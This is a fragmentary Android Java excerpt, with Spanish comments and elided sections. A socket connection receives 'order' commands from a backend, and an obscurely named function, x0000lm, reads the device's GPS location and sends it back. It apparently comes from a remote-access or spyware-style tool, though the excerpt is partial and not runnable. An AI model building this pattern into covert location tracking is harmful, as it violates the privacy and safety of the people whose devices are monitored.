...
public class ConnectionManager {
            ...
            ioSocket.on("order", new Emitter.Listener() {
                ...
                public void call(Object... args) {
                    try {
                        ...
                        e.printStackTrace();
                        // Si ocurre un error, notifícalo al backend
                        try {
                            JSONObject errorObj = new JSONObject();
                            errorObj.put("error", "Order error: " + e.getMessage());
                            ioSocket.emit("order-error", errorObj);
                        } catch (Exception ex) {}
                    }
                }
            });
    ...
    // NUEVO x0000lm - Asíncrono, nunca se cuelga, usa el callback de LocManager
    public static void x0000lm() {
        // Como se puede llamar desde un hilo, asegura que el contexto no sea null
        if (context == null) return;

        LocManager gps = new LocManager(context);

        gps.getLocationAsync((location, error) -> {
            JSONObject locationObj = new JSONObject();
            try {
                if (location != null) {
                    locationObj.put("enable", true);
                    ...
                    locationObj.put("timestamp", System.currentTimeMillis());
                } else {
                    locationObj.put("enable", false);
                    locationObj.put("error", error != null ? error : "No location available");
                }
            } catch (Exception e) {
                try {
                    locationObj.put("enable", false);
                    locationObj.put("error", "Exception: " + e.getMessage());
                } catch (Exception ignored) {}
            }
            ioSocket.emit("x0000lm", locationObj);
        });
    }
